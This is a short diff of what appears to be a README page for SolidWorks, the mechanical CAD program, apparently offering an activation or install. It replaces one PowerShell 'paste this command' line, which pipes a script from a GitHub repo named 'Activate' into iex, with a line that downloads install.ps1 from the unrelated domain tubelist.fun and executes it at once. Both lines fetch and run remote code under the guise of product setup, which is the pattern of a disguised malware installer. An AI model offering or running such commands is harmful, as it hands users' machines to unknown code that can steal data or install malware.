@@ -17,7 +17,7 @@ SolidWorks is a parametric CAD and simulation platform designed for mechanical e
 Run the following command in PowerShell to get started:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ---
